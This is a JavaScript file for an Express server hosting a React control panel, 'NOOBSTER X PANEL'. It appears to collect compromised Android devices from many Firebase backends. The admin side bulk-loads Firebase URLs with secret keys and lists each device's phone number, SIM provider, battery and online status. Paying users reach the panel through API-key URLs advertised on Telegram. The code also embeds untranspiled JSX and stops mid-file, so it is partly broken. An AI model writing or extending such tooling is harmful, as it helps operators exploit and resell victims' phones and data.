const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

// ============================================================
// YAHAN APNA ADMIN PASSWORD AUR CONFIG SET KAREIN
// ============================================================
const ADMIN_PASSWORD = "Noobster@2024";
const TELEGRAM_CHANNEL = "https://t.me/firebase1991";

// ============================================================
// HTML + REACT APP (Encoded String)
// ============================================================
const pageHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
    <title>NOOBSTER X PANEL</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root { --bg: #020202; --card: #0d0d0d; --border: #1f1f1f; --text: #e8e8e8; --muted: #666; --red: #dc2626; --green: #22c55e; --blue: #3b82f6; }
        body { font-family: 'Inter', sans-serif; background: radial-gradient(at 0% 0%, rgba(59,130,246,0.08) 0px, transparent 50%), radial-gradient(at 100% 0%, rgba(139,92,246,0.08) 0px, transparent 50%), #020202; color: var(--text); min-height: 100vh; }
        .glass { background: rgba(13,13,13,0.85); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.06); }
        .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 12px 20px; border-radius: 12px; font-weight: 600; font-size: 14px; cursor: pointer; border: none; transition: all 0.2s; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-primary { background: linear-gradient(135deg, #dc2626, #c2410c); color: #fff; box-shadow: 0 8px 20px -6px rgba(220,38,38,0.4); }
        .btn-primary:hover:not(:disabled) { transform: translateY(-1px); }
        .btn-secondary { background: #1a1a1a; border: 1px solid #2a2a2a; color: #aaa; }
        .btn-secondary:hover { background: #222; color: #fff; }
        .btn-danger { background: rgba(220,38,38,0.15); border: 1px solid rgba(220,38,38,0.3); color: #f87171; }
        .btn-danger:hover { background: rgba(220,38,38,0.25); }
        .input { width: 100%; padding: 12px 16px; border-radius: 12px; background: #111; border: 1px solid #222; color: #fff; font-size: 14px; outline: none; transition: all 0.2s; }
        .input:focus { border-color: #dc2626; }
        .card { background: #0d0d0d; border: 1px solid #1f1f1f; border-radius: 16px; padding: 20px; }
        .badge { display: inline-flex; align-items: center; gap: 4px; padding: 3px 10px; border-radius: 999px; font-size: 11px; font-weight: 600; }
        .badge-green { background: rgba(34,197,94,0.12); color: #4ade80; border: 1px solid rgba(34,197,94,0.25); }
        .badge-red { background: rgba(220,38,38,0.12); color: #f87171; border: 1px solid rgba(220,38,38,0.25); }
        .badge-amber { background: rgba(245,158,11,0.12); color: #fbbf24; border: 1px solid rgba(245,158,11,0.25); }
        .spinner { width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .fade-in { animation: fadeIn 0.4s ease-out; }
        .grid { display: grid; gap: 16px; }
        .grid-2 { grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); }
        .tabs { display: flex; gap: 4px; border-bottom: 1px solid #1a1a1a; margin-bottom: 20px; overflow-x: auto; }
        .tab { padding: 12px 18px; font-size: 13px; font-weight: 600; color: #555; border: none; background: none; cursor: pointer; border-bottom: 2px solid transparent; transition: all 0.2s; white-space: nowrap; }
        .tab.active { color: #f87171; border-bottom-color: #dc2626; }
        .device-card { background: #000; border: 1px solid #1f1f1f; border-radius: 16px; padding: 14px; transition: all 0.2s; }
        .device-card:hover { border-color: #333; transform: translateY(-2px); }
        .stat-card { background: #0d0d0d; border: 1px solid #1f1f1f; border-radius: 14px; padding: 16px; }
        .stat-value { font-size: 28px; font-weight: 900; line-height: 1; margin-top: 6px; }
        .stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; color: #555; font-weight: 600; }
        .toast { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: #1a1a1a; border: 1px solid #2a2a2a; color: #fff; padding: 14px 24px; border-radius: 14px; font-size: 14px; font-weight: 600; z-index: 99999; box-shadow: 0 10px 30px rgba(0,0,0,0.6); animation: fadeIn 0.3s ease-out; max-width: 90vw; }
        .toast.error { border-color: rgba(220,38,38,0.4); color: #f87171; }
        .toast.success { border-color: rgba(34,197,94,0.4); color: #4ade80; }
        .hidden { display: none !important; }
        .skeleton { background: linear-gradient(90deg, #111 25%, #1a1a1a 50%, #111 75%); background-size: 200% 100%; animation: shimmer 1.5s infinite; border-radius: 8px; }
        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
        .empty-state { text-align: center; padding: 60px 20px; color: #444; }
        @media (max-width: 640px) { .stat-value { font-size: 22px; } .tabs .tab { padding: 10px 12px; font-size: 12px; } }
    </style>
</head>
<body>
    <div id="root"></div>
    <script>
        const ADMIN_PASSWORD = ${JSON.stringify(ADMIN_PASSWORD)};
        const TELEGRAM_CHANNEL = ${JSON.stringify(TELEGRAM_CHANNEL)};

        const DB = {
            get: (k, def = null) => { try { const v = localStorage.getItem(k); return v ? JSON.parse(v) : def; } catch { return def; } },
            set: (k, v) => { try { localStorage.setItem(k, JSON.stringify(v)); } catch {} },
            del: (k) => { try { localStorage.removeItem(k); } catch {} }
        };

        const KEYS = { adminSession: "nb_admin_session", firebaseAccs: "nb_firebase_accs", apiKeys: "nb_api_keys", panelStatus: "nb_panel_status", broadcastHistory: "nb_broadcast_history" };

        if (!DB.get(KEYS.panelStatus)) DB.set(KEYS.panelStatus, { online: true, broadcast: "" });
        if (!DB.get(KEYS.apiKeys)) DB.set(KEYS.apiKeys, [{ id: 1, name: "Main API", key: "MY-WEB.SITE/v2/SLJSNSN19AJA", active: true }]);
        if (!DB.get(KEYS.broadcastHistory)) DB.set(KEYS.broadcastHistory, []);

        async function fetchFirebase(url, key, path) {
            let u = url.trim().replace(/\\/$/, "");
            if (!u.startsWith("http")) u = "https://" + u;
            const res = await fetch(\`\${u}/\${path}.json?auth=\${key.trim()}\`);
            if (!res.ok) {
                if (res.status === 401 || res.status === 403) throw new Error("PERMISSION_DENIED");
                throw new Error(\`HTTP_\${res.status}\`);
            }
            return res.json();
        }

        function parseDevices(data) {
            const out = [];
            if (!data || typeof data !== "object") return out;
            for (const [id, d] of Object.entries(data)) {
                if (!d || typeof d !== "object") continue;
                let sims = Array.isArray(d.sims) ? d.sims : (d.sims ? Object.values(d.sims) : []);
                const battery = String(d.battery ?? "—");
                out.push({
                    id, name: String(d.modelName || d.model || d.deviceName || id), battery,
                    batteryPercent: parseInt(battery.replace("%", "")) || 0, status: !!d.status,
                    phoneNumber: String(d.mobNo || (sims[0]?.phoneNumber ?? "—")),
                    android: String(d.androidV || d.androidVersion || "—"),
                    provider: String(d.service_provider || "—"), _accountUrl: url, _accountKey: key
                });
            }
            return out;
        }

        function formatTime(ms) {
            if (!ms) return "—";
            const diff = Date.now() - ms;
            const m = Math.floor(diff / 60000);
            if (m < 1) return "just now";
            if (m < 60) return \`\${m}m ago\`;
            return \`\${Math.floor(m/60)}h ago\`;
        }

        const { useState, useEffect, useCallback, useMemo } = React;

        function useToast() {
            const [toasts, setToasts] = useState([]);
            const push = useCallback((msg, type = "info") => {
                const id = Date.now() + Math.random();
                setToasts(t => [...t, { id, msg, type }]);
                setTimeout(() => setToasts(t => t.filter(x => x.id !== id)), 3000);
            }, []);
            return { toasts, push };
        }

        const Icon = ({ name, size = 16 }) => {
            const icons = {
                search: <><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></>,
                refresh: <><path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/><path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"/><path d="M8 16H3v5"/></>,
                logout: <><path d="m16 17 5-5-5-5"/><path d="M21 12H9"/><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/></>,
                plus: <><path d="M5 12h14"/><path d="M12 5v14"/></>,
                trash: <><path d="M10 11v6"/><path d="M14 11v6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/><path d="M3 6h18"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></>,
                shield: <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/>,
                zap: <path d="M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z"/>,
                send: <><path d="M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z"/><path d="m21.854 2.147-10.94 10.939"/></>,
                database: <><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5V19A9 3 0 0 0 21 19V5"/><path d="M3 12A9 3 0 0 0 21 12"/></>,
                power: <><path d="M12 2v10"/><path d="M18.4 6.6a9 9 0 1 1-12.77.04"/></>,
                megaphone: <><path d="m3 11 18-5v12L3 14v-3z"/><path d="M11.6 16.8a3 3 0 1 1-5.8-1.6"/></>,
                wifi: <><path d="M12 20h.01"/><path d="M2 8.82a15 15 0 0 1 20 0"/><path d="M5 12.859a10 10 0 0 1 14 0"/><path d="M8.5 16.429a5 5 0 0 1 7 0"/></>,
                key: <><circle cx="7.5" cy="15.5" r="5.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3L22 7l-3-3"/></>,
                download: <><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></>,
                copy: <><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></>,
                clock: <><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></>,
                lock: <><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></>
            };
            return React.createElement("svg", { width: size, height: size, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" }, icons[name]);
        };

        function SkeletonCard() {
            return React.createElement("div", { className: "device-card" },
                React.createElement("div", { className: "skeleton", style: { height: "16px", width: "60%", marginBottom: "10px" } }),
                React.createElement("div", { className: "skeleton", style: { height: "12px", width: "80%", marginBottom: "6px" } }),
                React.createElement("div", { className: "skeleton", style: { height: "12px", width: "70%" } })
            );
        }

        function EmptyState({ message, icon = "search" }) {
            return React.createElement("div", { className: "empty-state" },
                React.createElement("div", { style: { opacity: 0.4, marginBottom: "12px" } }, React.createElement(Icon, { name: icon, size: 48 })),
                React.createElement("p", { style: { fontSize: "14px" } }, message)
            );
        }

        function AdminLogin({ onSuccess }) {
            const [pass, setPass] = useState("");
            const [err, setErr] = useState("");
            const handleLogin = (e) => {
                e.preventDefault();
                if (pass === ADMIN_PASSWORD) {
                    DB.set(KEYS.adminSession, { loggedIn: true });
                    onSuccess();
                } else setErr("Invalid password");
            };
            return React.createElement("div", { style: { minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: "20px" } },
                React.createElement("div", { className: "glass fade-in", style: { borderRadius: "24px", padding: "40px 32px", maxWidth: "400px", width: "100%" } },
                    React.createElement("div", { style: { textAlign: "center", marginBottom: "28px" } },
                        React.createElement("div", { style: { width: "64px", height: "64px", borderRadius: "18px", background: "linear-gradient(135deg, #dc2626, #f97316)", display: "inline-flex", alignItems: "center", justifyContent: "center", marginBottom: "16px" } }, React.createElement(Icon, { name: "lock", size: 28 })),
                        React.createElement("h1", { style: { fontSize: "24px", fontWeight: 900 } }, "Admin Access")
                    ),
                    React.createElement("form", { onSubmit: handleLogin },
                        React.createElement("input", { type: "password", value: pass, onChange: e => setPass(e.target.value), placeholder: "Enter Admin Password", className: "input", autoFocus: true }),
                        err && React.createElement("p", { style: { fontSize: "12px", color: "#f87171", marginTop: "8px" } }, err),
                        React.createElement("button", { type: "submit", className: "btn btn-primary", style: { width: "100%", marginTop: "20px" } }, "Login")
                    )
                )
            );
        }

        function AdminDashboard({ onLogout, toast }) {
            const [tab, setTab] = useState("dashboard");
            const [accs, setAccs] = useState(() => DB.get(KEYS.firebaseAccs, []));
            const [apiKeys, setApiKeys] = useState(() => DB.get(KEYS.apiKeys, []));
            const [status, setStatus] = useState(() => DB.get(KEYS.panelStatus, { online: true, broadcast: "" }));
            const [broadcastHistory, setBroadcastHistory] = useState(() => DB.get(KEYS.broadcastHistory, []));
            const [devices, setDevices] = useState([]);
            const [loading, setLoading] = useState(false);
            const [search, setSearch] = useState("");
            const [bulkText, setBulkText] = useState("");
            const [newApiName, setNewApiName] = useState("");
            const [newApiKey, setNewApiKey] = useState("");
            const [broadcastMsg, setBroadcastMsg] = useState(status.broadcast || "");
            const [perAccCount, setPerAccCount] = useState({});

            const saveAccs = (list) => { setAccs(list); DB.set(KEYS.firebaseAccs, list); };
            const saveApis = (list) => { setApiKeys(list); DB.set(KEYS.apiKeys, list); };
            const saveStatus = (s) => { setStatus(s); DB.set(KEYS.panelStatus, s); };
            const saveHistory = (list) => { setBroadcastHistory(list); DB.set(KEYS.broadcastHistory, list); };

            const loadDevices = useCallback(async (silent = false) => {
                if (!silent) setLoading(true);
                const currentAccs = DB.get(KEYS.firebaseAccs, []);
                let allDevs = [], failedAccs = [], counts = {};
                await Promise.all(currentAccs.map(async (acc) => {
                    try {
                        const data = await fetchFirebase(acc.url, acc.key, "clients");
                        const devs = parseDevices(data);
                        devs.forEach(d => { d._accountName = acc.name || "Firebase"; });
                        allDevs.push(...devs); counts[acc.id] = devs.length;
                    } catch { failedAccs.push(acc.id); counts[acc.id] = 0; }
                }));
                if (failedAccs.length > 0) {
                    const filtered = currentAccs.filter(a => !failedAccs.includes(a.id));
                    saveAccs(filtered);
                    if (!silent) toast.push(`${failedAccs.length} dead Firebase accounts removed`, "error");
                }
                setDevices(allDevs); setPerAccCount(counts);
                if (!silent) setLoading(false);
            }, [toast]);

            useEffect(() => {
                loadDevices();
                const iv = setInterval(() => loadDevices(true), 20000);
                return () => clearInterval(iv);
            }, [loadDevices]);

            const handleBulkAdd = async () => {
                const lines = bulkText.split("\\n").map(l => l.trim()).filter(Boolean);
                if (lines.length === 0) return toast.push("Paste Firebase URLs + keys", "error");
                let newAccs = [];
                for (const line of lines) {
                    const parts = line.split(/[|,;\\t]/).map(p => p.trim());
                    if (parts.length >= 2) {
                        let url = parts[0];
                        if (!url.startsWith("http")) url = "https://" + url;
                        newAccs.push({ id: Date.now() + Math.random(), name: parts[2] || url.split("//")[1].split(".")[0], url, key: parts[1] });
                    }
                }
                if (newAccs.length > 0) {
                    saveAccs([...accs, ...newAccs]);
                    setBulkText("");
                    toast.push(`${newAccs.length} Firebases Added!`, "success");
                    loadDevices();
                }
            };

            const handleAddApi = () => {
                if (!newApiName || !newApiKey) return toast.push("Fill all API fields", "error");
                saveApis([...apiKeys, { id: Date.now(), name: newApiName, key: newApiKey, active: true }]);
                setNewApiName(""); setNewApiKey("");
                toast.push("API Key Created", "success");
            };

            const handleBroadcast = () => {
                if (!broadcastMsg.trim()) return toast.push("Type a message", "error");
                saveStatus({...status, broadcast: broadcastMsg});
                saveHistory([{ id: Date.now(), msg: broadcastMsg, time: Date.now() }, ...broadcastHistory].slice(0, 20));
                toast.push("Broadcast Sent!", "success");
            };

            const filteredDevices = useMemo(() => {
                if (!search.trim()) return devices;
                const q = search.toLowerCase();
                return devices.filter(d => d.name.toLowerCase().includes(q) || d.phoneNumber.toLowerCase().includes(q) || d.android.toLowerCase().includes(q) || (d._accountName || "").toLowerCase().includes(q));
            }, [devices, search]);

            const stats = { total: devices.length, online: devices.filter(d => d.status).length, offline: devices.filter(d => !d.status).length, accs: accs.length, apis: apiKeys.length };

            return React.createElement("div", { style: { minHeight: "100vh", paddingBottom: "40px" } },
                React.createElement("header", { style: { background: "rgba(10,10,10,0.85)", backdropFilter: "blur(20px)", borderBottom: "1px solid #1a1a1a", padding: "14px 24px", display: "flex", alignItems: "center", justifyContent: "space-between", position: "sticky", top: 0, zIndex: 100 } },
                    React.createElement("div", { style: { display: "flex", alignItems: "center", gap: "10px" } },
                        React.createElement("div", { style: { width: "32px", height: "32px", borderRadius: "10px", background: "linear-gradient(135deg, #dc2626, #f97316)", display: "flex", alignItems: "center", justifyContent: "center" } }, React.createElement(Icon, { name: "shield", size: 16, color: "#fff" })),
                        React.createElement("span", { style: { fontSize: "16px", fontWeight: 800 } }, "Admin Panel")
                    ),
                    React.createElement("button", { className: "btn btn-secondary", onClick: onLogout }, React.createElement(Icon, { name: "logout", size: 14 }), " Logout")
                ),
                React.createElement("main", { style: { maxWidth: "1200px", margin: "0 auto", padding: "24px" } },
                    React.createElement("div", { className: "tabs" },
                        ["dashboard", "bulk_firebase", "api_keys", "control"].map(t => React.createElement("button", { key: t, className: `tab ${tab === t ? "active" : ""}`, onClick: () => setTab(t) }, t.replace("_", " ").toUpperCase()))
                    ),
                    tab === "dashboard" && React.createElement("div", { className: "fade-in" },
                        React.createElement("div", { className: "grid", style: { gridTemplateColumns: "repeat(auto-fill, minmax(140px, 1fr))", marginBottom: "24px" } },
                            React.createElement("div", { className: "stat-card" }, React.createElement("div", { className: "stat-label" }, "Total"), React.createElement("div", { className: "stat-value" }, stats.total)),
                            React.createElement("div", { className: "stat-card" }, React.createElement("div", { className: "stat-label" }, "Online"), React.createElement("div", { className: "stat-value", style: { color: "#22c55e" } }, stats.online)),
                            React.createElement("div", { className: "stat-card" }, React.createElement("div", { className: "stat-label" }, "Offline"), React.createElement("div", { className: "stat-value", style: { color: "#666" } }, stats.offline)),
                            React.createElement("div", { className: "stat-card" }, React.createElement("div", { className: "stat-label" }, "Firebase"), React.createElement("div", { className: "stat-value", style: { color: "#60a5fa" } }, stats.accs)),
                            React.createElement("div", { className: "stat-card" }, React.createElement("div", { className: "stat-label" }, "API Keys"), React.createElement("div", { className: "stat-value", style: { color: "#fbbf24" } }, stats.apis))
                        ),
                        React.createElement("div", { style: { display: "flex", gap: "10px", marginBottom: "16px", flexWrap: "wrap" } },
                            React.createElement("div", { style: { flex: 1, position: "relative", minWidth: "200px" } },
                                React.createElement("div", { style: { position: "absolute", left: "14px", top: "50%", transform: "translateY(-50%)", color: "#555" } }, React.createElement(Icon, { name: "search", size: 16 })),
                                React.createElement("input", { className: "input", placeholder: "Search devices...", value: search, onChange: e => setSearch(e.target.value), style: { paddingLeft: "40px" } })
                            ),
                            React.createElement("button", { className: "btn btn-secondary", onClick: () => loadDevices(), disabled: loading }, loading ? React.createElement("div", { className: "spinner" }) : React.createElement(Icon, { name: "refresh", size: 14 }), " Refresh")
                        ),
                        React.createElement("div", { className: "grid grid-2" },
                            filteredDevices.map(d => React.createElement("div", { key: d.id + d._accountName, className: "device-card" },
                                React.createElement("div", { style: { display: "flex", justifyContent: "space-between", marginBottom: "8px" } },
                                    React.createElement("div", { style: { fontWeight: 700, fontSize: "13px" } }, d.name),
                                    React.createElement("span", { className: `badge ${d.status ? "badge-green" : "badge-red"}` }, d.status ? "Online" : "Offline")
                                ),
                                React.createElement("div", { style: { fontSize: "11px", color: "#888" } }, `Phone: ${d.phoneNumber} | Bat: ${d.battery}`),
                                React.createElement("div", { style: { fontSize: "10px", color: "#555", marginTop: "8px" } }, `Source: ${d._accountName}`)
                            ))
                        ),
                        filteredDevices.length === 0 && React.createElement(EmptyState, { message: search ? "No devices match your search" : "No devices loaded" })
                    ),
                    tab === "bulk_firebase" && React.createElement("div", { className: "fade-in" },
                        React.createElement("div", { className: "card", style: { marginBottom: "16px" } },
                            React.createElement("h2", { style: { fontSize: "16px", marginBottom: "10px" } }, "Bulk Add Firebase (100+)"),
                            React.createElement("p", { style: { fontSize: "12px", color: "#666", marginBottom: "16px" } }, "Format: URL | KEY | NAME (One per line)"),
                            React.createElement("textarea", { className: "input", rows: 8, value: bulkText, onChange: e => setBulkText(e.target.value), placeholder: "https://app1.firebaseio.com | SECRET_KEY | App 1", style: { fontFamily: "monospace" } }),
                            React.createElement("button", { className: "btn btn-primary", onClick: handleBulkAdd, style: { marginTop: "16px" } }, "Save & Load Firebases")
                        ),
                        React.createElement("div", { className: "card" },
                            React.createElement("h3", { style: { fontSize: "14px", marginBottom: "12px" } }, `Active Firebases (${accs.length})`),
                            accs.length === 0 ? React.createElement(EmptyState, { message: "No firebases added yet", icon: "database" }) : accs.map(acc => React.createElement("div", { key: acc.id, style: { display: "flex", alignItems: "center", justifyContent: "space-between", background: "#111", padding: "12px", borderRadius: "10px", marginBottom: "8px", border: "1px solid #222", gap: "10px" } },
                                React.createElement("div", { style: { flex: 1, minWidth: 0 } },
                                    React.createElement("div", { style: { fontSize: "13px", fontWeight: 700, display: "flex", alignItems: "center", gap: "8px" } }, acc.name, React.createElement("span", { className: "badge badge-amber" }, `${perAccCount[acc.id] || 0} devices`)),
                                    React.createElement("div", { style: { fontSize: "11px", color: "#60a5fa", fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" } }, acc.url)
                                ),
                                React.createElement("button", { className: "btn btn-danger", style: { padding: "8px 12px" }, onClick: () => { saveAccs(accs.filter(a => a.id !== acc.id)); toast.push("Firebase removed"); } }, React.createElement(Icon, { name: "trash", size: 14 }))
                            ))
                        )
                    ),
                    tab === "api_keys" && React.createElement("div", { className: "card fade-in" },
                        React.createElement("h2", { style: { fontSize: "16px", marginBottom: "10px" } }, "Custom API Keys"),
                        React.createElement("p", { style: { fontSize: "12px", color: "#666", marginBottom: "16px" } }, "Use these URLs to access the panel without Firebase logic."),
                        React.createElement("div", { style: { display: "flex", gap: "10px", marginBottom: "20px", flexWrap: "wrap" } },
                            React.createElement("input", { className: "input", placeholder: "API Name", value: newApiName, onChange: e => setNewApiName(e.target.value), style: { flex: 1, minWidth: "200px" } }),
                            React.createElement("input", { className: "input", placeholder: "Key (e.g. v2/XYZ123)", value: newApiKey, onChange: e => setNewApiKey(e.target.value), style: { flex: 1, minWidth: "200px" } }),
                            React.createElement("button", { className: "btn btn-primary", onClick: handleAddApi }, React.createElement(Icon, { name: "plus", size: 14 }), " Add")
                        ),
                        apiKeys.length === 0 ? React.createElement(EmptyState, { message: "No API keys yet", icon: "key" }) : apiKeys.map(api => React.createElement("div", { key: api.id, style: { display: "flex", alignItems: "center", justifyContent: "space-between", background: "#111", padding: "12px", borderRadius: "10px", marginBottom: "8px", border: "1px solid #222", gap: "10px" } },
                            React.createElement("div", { style: { flex: 1, minWidth: 0 } },
                                React.createElement("div", { style: { fontSize: "13px", fontWeight: 700 } }, api.name),
                                React.createElement("div", { style: { fontSize: "11px", color: "#60a5fa", fontFamily: "monospace" } }, `/${api.key}`)
                            ),
                            React.createElement("button", { className: "btn btn-danger", style: { padding: "8px 12px" }, onClick: () => saveApis(apiKeys.filter(a => a.id !== api.id)) }, React.createElement(Icon, { name: "trash", size: 14 }))
                        ))
                    ),
                    tab === "control" && React.createElement("div", { className: "fade-in" },
                        React.createElement("div", { className: "card", style: { marginBottom: "16px" } },
                            React.createElement("h2", { style: { fontSize: "16px", marginBottom: "16px" } }, "Panel Control"),
                            React.createElement("div", { style: { display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px", background: status.online ? "rgba(34,197,94,0.08)" : "rgba(220,38,38,0.08)", border: `1px solid ${status.online ? "rgba(34,197,94,0.3)" : "rgba(220,38,38,0.3)"}`, borderRadius: "12px" } },
                                React.createElement("div", { style: { fontWeight: 700 } }, "Server: ", React.createElement("span", { style: { color: status.online ? "#4ade80" : "#f87171" } }, status.online ? "ONLINE" : "OFFLINE")),
                                React.createElement("button", { className: `btn ${status.online ? "btn-danger" : "btn-primary"}`, onClick: () => { saveStatus({...status, online: !status.online}); toast.push("Status updated"); } }, React.createElement(Icon, { name: "power", size: 14 }), " Turn ", status.online ? "OFF" : "ON")
                            )
                        ),
                        React.createElement("div", { className: "card" },
                            React.createElement("h3", { style: { fontSize: "14px", marginBottom: "10px" } }, "Broadcast Message"),
                            React.createElement("textarea", { className: "input", rows: 3, value: broadcastMsg, onChange: e => setBroadcastMsg(e.target.value), placeholder: "Type message for public..." }),
                            React.createElement("div", { style: { display: "flex", gap: "10px", marginTop: "10px" } },
                                React.createElement("button", { className: "btn btn-primary", onClick: handleBroadcast }, React.createElement(Icon, { name: "megaphone", size: 14 }), " Send Broadcast"),
                                React.createElement("button", { className: "btn btn-secondary", onClick: () => { setBroadcastMsg(""); saveStatus({...status, broadcast: ""}); toast.push("Broadcast cleared"); } }, "Clear")
                            ),
                            broadcastHistory.length > 0 && React.createElement("div", { style: { marginTop: "20px" } },
                                React.createElement("h4", { style: { fontSize: "12px", color: "#555", textTransform: "uppercase", letterSpacing: "0.1em", marginBottom: "10px" } }, "Recent Broadcasts"),
                                broadcastHistory.slice(0, 5).map(h => React.createElement("div", { key: h.id, style: { background: "#111", padding: "10px", borderRadius: "8px", marginBottom: "6px", border: "1px solid #1f1f1f" } },
                                    React.createElement("div", { style: { fontSize: "12px", color: "#ccc" } }, h.msg),
                                    React.createElement("div", { style: { fontSize: "10px", color: "#555", marginTop: "4px" } }, formatTime(h.time))
                                ))
                            )
                        )
                    )
                )
            );
        }

        function PublicPanel() {
            const [status, setStatus] = useState(() => DB.get(KEYS.panelStatus, { online: true, broadcast: "" }));
            const [devices, setDevices] = useState([]);
            const [loading, setLoading] = useState(true);
            const [search, setSearch] = useState("");
            const [autoRefresh, setAutoRefresh] = useState(true);
            const [lastSync, setLastSync] = useState(null);

            const urlPath = window.location.pathname;
            const apiKeys = DB.get(KEYS.apiKeys, []);
            const isValidApi = apiKeys.some(k => urlPath.includes(k.key) && k.active);

            const loadDevices = useCallback(async (silent = false) => {
                if (!silent) setLoading(true);
                const accs = DB.get(KEYS.firebaseAccs, []);
                let all = [];
                await Promise.all(accs.map(async (acc) => {
                    try {
                        const data = await fetchFirebase(acc.url, acc.key, "clients");
                        const devs = parseDevices(data);
                        devs.forEach(d => d._accountName = acc.name);
                        all.push(...devs);
                    } catch {}
                }));
                setDevices(all); setLastSync(Date.now()); setLoading(false);
            }, []);

            useEffect(() => {
                if (!status.online || !isValidApi) { setLoading(false); return; }
                loadDevices();
                if (!autoRefresh) return;
                const iv = setInterval(() => loadDevices(true), 20000);
                return () => clearInterval(iv);
            }, [status.online, isValidApi, autoRefresh, loadDevices]);

            const filtered = useMemo(() => {
                if (!search.trim()) return devices;
                const q = search.toLowerCase();
                return devices.filter(d => d.name.toLowerCase().includes(q) || d.phoneNumber.toLowerCase().includes(q) || d.android.toLowerCase().includes(q) || d.provider.toLowerCase().includes(q));
            }, [devices, search]);

            if (!isValidApi || !status.online) {
                return React.createElement("div", { style: { minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: "20px" } },
                    React.createElement("div", { className: "glass", style: { borderRadius: "24px", padding: "48px 32px", maxWidth: "420px", textAlign: "center" } },
                        React.createElement("div", { style: { width: "80px", height: "80px", borderRadius: "24px", background: "rgba(220,38,38,0.15)", border: "1px solid rgba(220,38,38,0.3)", display: "inline-flex", alignItems: "center", justifyContent: "center", marginBottom: "20px", margin: "0 auto 20px" } }, React.createElement(Icon, { name: "lock", size: 36, color: "#f87171" })),
                        React.createElement("h1", { style: { fontSize: "24px", fontWeight: 900, color: "#f87171", marginBottom: "8px" } }, "Access Denied"),
                        React.createElement("p", { style: { fontSize: "14px", color: "#888" } }, "Invalid API Key or Server is Offline."),
                        status.broadcast && React.createElement("div", { style: { marginTop: "20px", padding: "14px", background: "rgba(245,158,11,0.08)", border: "1px solid rgba(245,158,11,0.25)", borderRadius: "12px" } },
                            React.createElement("p", { style: { fontSize: "13px", color: "#fbbf24" } }, `📢 ${status.broadcast}`)
                        )
                    )
                );
            }

            return React.createElement("div", { style: { minHeight: "100vh" } },
                React.createElement("header", { style: { background: "rgba(10,10,10,0.85)", backdropFilter: "blur(20px)", borderBottom: "1px solid #1a1a1a", padding: "14px 24px", display: "flex", alignItems: "center", justifyContent: "space-between", position: "sticky", top: 0, zIndex: 100, gap: "10px" } },
                    React.createElement("div", { style: { display: "flex", alignItems: "center", gap: "10px" } },
                        React.createElement("div", { style: { width: "32px", height: "32px", borderRadius: "10px", background: "linear-gradient(135deg, #dc2626, #f97316)", display: "flex", alignItems: "center", justifyContent: "center" } }, React.createElement(Icon, { name: "zap", size: 16, color: "#fff" })),
                        React.createElement("span", { style: { fontSize: "16px", fontWeight: 800 } }, React.createElement("span", { style: { color: "#6acfff" } }, "NOOBSTER"), " X PANEL")
                    ),
                    React.createElement("a", { href: TELEGRAM_CHANNEL, target: "_blank", className: "btn btn-secondary", style: { padding: "8px 14px", fontSize: "12px" } }, React.createElement(Icon, { name: "send", size: 14 }), " Telegram")
                ),
